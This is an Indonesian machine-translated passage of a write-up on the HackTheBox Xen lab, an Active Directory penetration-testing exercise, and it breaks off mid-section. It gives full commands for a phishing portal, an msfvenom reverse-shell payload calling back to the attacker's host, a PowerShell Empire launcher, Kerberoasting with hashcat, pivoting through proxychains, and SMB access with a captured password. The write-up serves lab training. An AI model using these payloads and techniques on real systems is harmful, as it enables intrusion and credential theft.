<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>◾️ 🕉️ ⛹🏾 HackTheBox endgame. Panduan Xen Lab. Direktori Aktif Pentest 🤲🏿 🐯 🏂🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, kami akan menganalisis bagian tidak hanya dari mobil, tetapi dari seluruh laboratorium mini dari situs HackTheBox . 
 
 Seperti yang...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox endgame. Panduan Xen Lab. Direktori Aktif Pentest</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/506980/"><img src="https://habrastorage.org/webt/-g/rq/3z/-grq3z8cvxjlhbkdm-hjxkdwcqc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada artikel ini, kami akan menganalisis bagian tidak hanya dari mobil, tetapi dari seluruh laboratorium mini dari situs </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang dinyatakan dalam deskripsi, Xen dirancang untuk menguji keterampilan di semua tahap serangan di lingkungan Active Directory kecil. </font><font style="vertical-align: inherit;">Tujuannya adalah untuk mengkompromikan host yang dapat diakses, meningkatkan hak istimewa dan, akhirnya, kompromi seluruh domain, sambil mengumpulkan 6 bendera. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lihat diskusi tentang laboratorium Operasi Serangan Profesional lainnya di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koneksi ke laboratorium adalah melalui VPN. </font><font style="vertical-align: inherit;">Disarankan untuk tidak terhubung dari komputer kerja atau dari host di mana data penting bagi Anda tersedia, karena Anda berakhir di jaringan pribadi dengan orang-orang yang tahu sesuatu di bidang keamanan informasi :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informasi Organisasi</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intro</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Endgame ini terdiri dari 6 mesin, dan berisi 6 bendera. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qi/7m/jd/qi7mjdxucpxhje-cia76n_y_uio.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Deskripsi dan alamat host yang tersedia juga diberikan. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ks/h6/wl/ksh6wls_-pv2e2rmk0xbg_cc-x4.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ayo mulai!</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Melanggar bendera</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mesin ini memiliki alamat IP 10.13.38.12, yang saya tambahkan ke / etc / hosts. </font></font><br>
<code>10.13.38.12 xen.htb</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, kami memindai port terbuka. </font><font style="vertical-align: inherit;">Karena butuh waktu lama untuk memindai semua port dengan nmap, saya akan melakukan ini dengan masscan. </font><font style="vertical-align: inherit;">Kami memindai semua port TCP dan UDP dari antarmuka tun0 dengan kecepatan 500 paket per detik.</font></font><br>
<br>
<pre><code class="bash hljs">sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.12 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/38/-e/xn/38-exn8blvfxcaqrpue5ekc_hwk.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang, untuk informasi lebih rinci tentang layanan yang beroperasi pada port, kami akan menjalankan pemindaian dengan opsi -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A xen.htb -p25,80,443</code></pre><br>
<img src="https://habrastorage.org/webt/28/b1/pr/28b1pr7-okzchmg-ci1ggbaxpow.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi, kami memiliki IIS dan SMTP. Pada saat yang sama, ada kemungkinan koneksi HTTP dan HTTPS pada port 80 dan 443. Mari kita lihat web - kami disambut oleh situs sederhana. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/up/in/cc/upinccvylfqvhode8at6xivs-ny.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tidak ada yang menarik, kecuali tautan "Bergabung dengan tim", yang menunjukkan alamat email kami jointheteam@humongousretail.com. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/1l/n2/k_/1ln2k_xo-b0vaxpdi1dhl2g2tqa.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita pergi melalui direktori. Saya menggunakan gobuster untuk ini. Dalam parameter kami menunjukkan jumlah aliran 128 (-t), URL (-u), kamus (-w) dan ekstensi yang menarik bagi kami (-x).</font></font><br>
<br>
<pre><code class="bash hljs">gobuster dir -t 128 -u http://xen.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,aspx</code></pre><br>
<img src="https://habrastorage.org/webt/0w/rp/et/0wrpetqsiwo1s2ylorprhhgugce.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami menemukan beberapa direktori yang menarik. Kode 401 menunjukkan keberadaan otentikasi HTTP, mari kita lihat jauh. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xo/du/8e/xodu8eovut5bbieahdwnatbyqqg.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami menerima, dan kami membutuhkan kredensial. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5v/e0/1w/5ve01wb7xkwxjghn9laebsvcsxm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami membutuhkan kredensial. Dengan ini, saya memutuskan untuk kembali ke server SMTP dan memilah-milah nama pengguna (saya sarankan menggunakan yang ditawarkan Metasploit sebagai daftar nama). Kami melakukan ini menggunakan smtp-user-enum.</font></font><br>
<br>
<pre><code class="bash hljs">smtp-user-enum -M RCPT -U ./namelist.txt -D humongousretail.com -t xen.htb</code></pre><br>
<img src="https://habrastorage.org/webt/6x/vm/nf/6xvmnfxy7zrbwymwuy53mtsjub4.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami menemukan 4 alamat email. Karena kami melihat email layanan TI, kami dapat mengirim pesan ke semua pengguna lain atas nama mereka. Mari salin halaman otorisasi jarak jauh, buat yang palsu dan kirim semua pengguna alamat Remote Portal palsu (pada kenyataannya, saya sangat terkejut ketika ternyata ini adalah vektor yang benar). </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat membuat salinan lengkap halaman menggunakan ekstensi SingleFile untuk Firefox. Selanjutnya, lihat kode sumber dan ubah formulir data. Yang pertama adalah mengubah alamat tempat kredensial akan dikirim, saya mengatur host dan port 81 saya. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ki/_g/d3/ki_gd3wwmdo9rn2ywyixxrzlpdw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan tambahkan Kirim untuk mengirim data. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ad/zf/bx/adzfbxlqlhef4csitqunfnqmxks.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang jalankan netcat untuk mendengarkan pada port 81, aktifkan server web dan lihat file yang dimodifikasi sebagai index.html.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jt/td/om/jttdomb7-i7rlqdhj4uasj9a8le.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/uf/-7/ud/uf-7ud36kzhbi3qvwd9yjlap2sw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Berhasil! </font><font style="vertical-align: inherit;">Mari kita mengirim pesan tentang mengubah alamat portal. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/kf/q6/nfkfq6zng1tkm8owwsztsoyisfq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tapi vektornya benar, tetapi pelaksanaannya tidak terlalu) Jadi kami mendapatkan data, tetapi dalam bentuk robot pada port 80. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/de/xw/dp/dexwdpkgpo_oqb4ca2vczmwwqzi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian kami mengumpulkan semua akun. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan sekarang kita pergi ke remote. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mv/oq/v2/mvoqv2pe00qndtibx9aeprwh-uq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami mengusulkan untuk menyimpan file ICA. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yd/ke/a3/ydkea3fwsacwjzdcfe6qptwo1ra.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selanjutnya, saya menginstal ekstensi untuk Chromium. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/uf/nc/b4/ufncb4a2m0qdb2czjakbke5i9v4.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan terhubung sebagai pmorgan (VDESKTOP3). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o8/ke/gx/o8kegx9kxnfiyskutyymimonhwo.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/a4/gb/1o/a4gb1of_eannxkf2gdhb-ra4cg8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami melakukan hal yang sama dengan pengguna lain. </font><font style="vertical-align: inherit;">Dan awardel menemukan bendera pertama. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/1z/vs/ig/1zvsigpck-o1os7hmzs70jecape.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan menyewanya. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yw/ii/9n/ywii9nxpta3h-scvghrdis9gpow.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan simpan informasi yang dikumpulkan.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sebarkan bendera</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda mungkin memperhatikan bahwa sistem operasi bukan yang terbaru, jadi harus ada exploit. </font><font style="vertical-align: inherit;">Mari kita lempar shell meterpreter. </font><font style="vertical-align: inherit;">Pertama, buat beban.</font></font><br>
<br>
<pre><code class="bash hljs">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.14.9 LPORT=3434 -f exe &gt; s.exe</code></pre><br>
<img src="https://habrastorage.org/webt/l6/cw/fp/l6cwfpozbfayv9egysl_lshdw-o.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang jalankan pendengar metasploit.</font></font><br>
<br>
<pre><code class="bash hljs">handler -H 10.14.14.9 -P 3434 -p windows/x64/meterpreter/reverse_tcp</code></pre><br>
<img src="https://habrastorage.org/webt/af/rg/xh/afrgxhmdhrqsctrusvic-hftrqy.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami pergi melalui browser di mesin target, unduh dan jalankan load. </font><font style="vertical-align: inherit;">Di jendela Metasploit, perhatikan koneksi di sesi pertama. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gk/95/hl/gk95hlyj70r7tqijdrcc3cdpi9g.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/hp/cs/g-/hpcsg-39centm7wanbtccngaqa0.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kami daftar semua eksploitasi untuk LPE. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ai/_l/nj/ai_lnjg4to9h_7u5uf4yl706fjw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan ada beberapa. </font><font style="vertical-align: inherit;">Mari kita gunakan yang pertama, itu akan memungkinkan Anda untuk mendapatkan konteks sistem. </font><font style="vertical-align: inherit;">Luncurkan pendengar baru. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7t/bt/qe/7tbtqeoikcykli7ck9tategndxk.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan gunakan exploit. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3x/oz/pa/3xozpavk13cms-vl_yhxwy7a0rk.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sesi kedua dibuka dalam konteks SISTEM. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cg/qi/uh/cgqiuh4chvqmax4smhxkopyae34.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita periksa benderanya. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/lq/rn/4m/lqrn4m6ruh6a29ufxfmffi8xjvw.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan ambillah. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2m/_g/ct/2m_gctbxaccolc792cmxvfb5bgi.png"><br>
<br>
<img src="https://habrastorage.org/webt/ty/fy/yv/tyfyyv-vw0yeo5eid8_gy4fwr4i.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sangat mudah untuk melewati bendera lain. </font><font style="vertical-align: inherit;">Kami melangkah lebih jauh.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bendera hantu</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk eksplorasi lebih lanjut, nyaman menggunakan PowerShell, dan bahkan lebih mudah digunakan melalui PowerShell Empire (yang saya tulis di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ). </font><font style="vertical-align: inherit;">Mari kita buka sesi, untuk ini pertama buat peluncur http dan PS untuk itu.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; listeners<font></font>
&gt; uselistener http<font></font>
&gt; <span class="hljs-built_in">set</span> Host 10.14.14.9<font></font>
&gt; <span class="hljs-built_in">set</span> Port 5656<font></font>
&gt; execute<font></font>
&gt; back<font></font>
&gt; launcher powershell http</code></pre><br>
<img src="https://habrastorage.org/webt/nw/h8/k_/nwh8k_g7pvp4d25k6mcm_g5ase0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Simpan peluncur ke file s.ps1. </font><font style="vertical-align: inherit;">Untuk menjalankannya dari memori melalui meterpreter, Anda perlu memuat modul PowerShell. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xe/hf/0m/xehf0mmdd6b0-hmnfbbqivm45p0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan jalankan powershell_import. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-f/nw/vv/-fnwvvmgxgd2stpsoceiizkfxhu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di jendela Empire, kami menemukan agen yang dibuat. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/f2/cm/7m/f2cm7mexe3pdgwtdgc_mghacli0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk pekerjaan yang nyaman, ganti nama itu dengan nama workstation dan masuk ke mode interaktif. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ne/vj/oh/nevjoh8xwwovniicwob5gp6k-6u.png"><br>
<br>
<img src="https://habrastorage.org/webt/hj/uc/n3/hjucn3yy2uihhkibe99yoamwpfi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk intelijen, kita perlu mendefinisikan pengontrol domain. </font><font style="vertical-align: inherit;">Kami akan melakukan ini dengan bantuan satu modul get_domain_controller dari bagian situational_awareness.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_domain_controller<font></font>
&gt; run<font></font>
</code></pre><br>
<img src="https://habrastorage.org/webt/pf/xe/61/pfxe61ftwboyhaqczuzu16huiho.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami mendapatkan informasi tentang pengontrol domain. </font><font style="vertical-align: inherit;">Sekarang mari kita daftarkan pengguna domain. </font><font style="vertical-align: inherit;">Pada titik ini, saya perlu mendapatkan nama akun dan nilai properti AdminCount untuk segera mengidentifikasi pengguna istimewa.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties samaccountname,admincount<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/ep/bm/8n/epbm8n-0pxbqjkx8ugmru5mx84q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita periksa SPNs segera untuk menentukan apakah Kerberoasting mungkin.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties serviceprincipalname<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/24/tu/qt/24tuqtogjlqw_wyj_wtkmirvjjq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan ada SPN! </font><font style="vertical-align: inherit;">Mari kita lakukan Kerberoasting menggunakan Kekaisaran yang sama. </font><font style="vertical-align: inherit;">Tentukan format output - hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule credentials/invoke_kerberoast<font></font>
&gt; <span class="hljs-built_in">set</span> OutputFormat Hashcat<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/fc/rt/n3/fcrtn3wmff8er48hsi4ck4epipe.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami mendapatkan hash pengguna. </font><font style="vertical-align: inherit;">Sekarang beralih melalui hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 -a 0 krb.hash rockyou.txt --force</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kata sandi ini tidak ditemukan di kamus rockyou, jadi saya memeriksa semua kamus dari Seclists. </font><font style="vertical-align: inherit;">Tetapi opsi ini juga gagal. </font><font style="vertical-align: inherit;">Opsi terakhir adalah menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aturan NSA</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jx/zh/kx/jxzhkxufm6pnpkkqjbqpe-fmj-k.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang disajikan dalam repositori, penyelaman adalah pilihan terbaik, jadi kami menggunakan versi keduanya.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 krb.hash rockyou.txt -r nsa-rules/_NSAKEY.v2.dive.rule -debug-mode=1 -debug-file=rule.txt -d 2</code></pre><br>
<img src="https://habrastorage.org/webt/8t/m8/yy/8tm8yyoriogouhedrvjvixunnc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami mendapatkan kata sandi untuk pengguna ini. </font><font style="vertical-align: inherit;">Untuk kemajuan lebih lanjut, mari kita memindai jaringan lokal. </font><font style="vertical-align: inherit;">Ini paling baik dilakukan menggunakan pemindaian ARP, karena ICMP mungkin diblokir. </font><font style="vertical-align: inherit;">Modul arpscan akan membantu kami dalam hal ini. Kami tahu alamat dan penutup jaringan, jadi kami akan mengatur kisaran host.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/arpscan<font></font>
&gt; <span class="hljs-built_in">set</span> Range 172.16.249.0-172.16.249.255<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/7f/vh/qd/7fvhqd_c2vdhwqryakt7yi7kaxu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi ... Dari daftar ini kita tidak tahu dua host: 201 dan 202. Mari kita periksa sumber daya bersama di domain. </font><font style="vertical-align: inherit;">Dari parameter kita hanya perlu alamat pengontrol domain.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/share_finder<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/rs/p3/6d/rsp36dpdijzbbrioueihsptddj0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan setiap pemindaian, pemahaman kita tentang jaringan meluas, mari kita cari tahu jenis host CITRIX.htb.local. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cu/rk/m0/curkm01lzbyve769e7kdt7jjao4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di bawah ini adalah informasi yang kami kumpulkan. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/zd/8z/sdzd8z_kll5ijcesm_asfi6xqse.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk berinteraksi dengan sumber daya di jaringan internal, kita perlu mengkonfigurasi terowongan. </font><font style="vertical-align: inherit;">Kami akan melakukan ini dalam sesi meterpreter aktif menggunakan perintah autoroute, dan menentukan alamat jaringan internal dan mask sebagai parameter (dengan parameter -p kita dapat memeriksa rute aktif).</font></font><br>
<br>
<pre><code class="bash hljs">run autoroute -s 172.16.249.0/24 </code></pre><br>
<img src="https://habrastorage.org/webt/tn/tu/9y/tntu9y40tdn28avzmqtgl3o0ffw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kita telah menambahkan rute ke jaringan target, kita akan menggunakan alat socks4a dari dalam platform. </font><font style="vertical-align: inherit;">Modul bantu auxiliary / server / socks4a menyediakan server proxy yang menggunakan infrastruktur perutean Metasploit yang kami buat untuk menyampaikan koneksi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-v/_j/0b/-v_j0bfvhwes3e1slvn42fwceqi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan sebagai redirector klien kami menggunakan rantai proxy. </font><font style="vertical-align: inherit;">Ubah konfigurasi /etc/proxychains.conf, yang menentukan port yang ditetapkan oleh metasploit (port default adalah 1080). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cy/_5/oh/cy_5ohot9iirrdzik2qssk8hj4a.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan untuk pengguna yang ditemukan, direktori $ Citrix dapat dibaca. </font><font style="vertical-align: inherit;">Karena proxychains menampilkan informasi koneksi, kami menghapusnya menggunakan pengalihan 2&gt; / dev / null.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local 172.16.249.201 --share <span class="hljs-string">"Citrix$"</span> --shares 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/qv/nr/ol/qvnroleugjrgp-i5izk_ovbpdps.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita lihat semua yang tersedia untuk kita di sumber ini.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains smbmap -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local -H 172.16.249.201 -R 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/mj/g3/-n/mjg3-n6art569eklzc6dsoqx_fy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami menemukan bendera serta file ppk. </font><font style="vertical-align: inherit;">Mari kita ambil semua file.</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install!</code></pre><br>
<img src="https://habrastorage.org/webt/bi/s2/hw/bis2hwyvpobzvdkqykpbac_wfz0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saat menghubungkan, kami mendapatkan kesalahan yang bisa dihilangkan dengan menentukan opsi protokol min klien.</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install! --option=<span class="hljs-string">'client min protocol=NT1'</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/vn/yi/bh/vnyibhq9ui9jd9-smv92jserdqg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan serahkan bendera itu.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/zy/o3/uy/zyo3uyt0kbvkkijgwr_vdwnaa5i.png"><br>
<br>
<img src="https://habrastorage.org/webt/js/y2/pp/jsy2ppljrcwqjfvit23y4pzisig.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bendera kamuflase</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari cari tahu kunci pribadi Putty. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u9/kg/z-/u9kgz-0fzwj3uftpn1yjzumc5qa.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
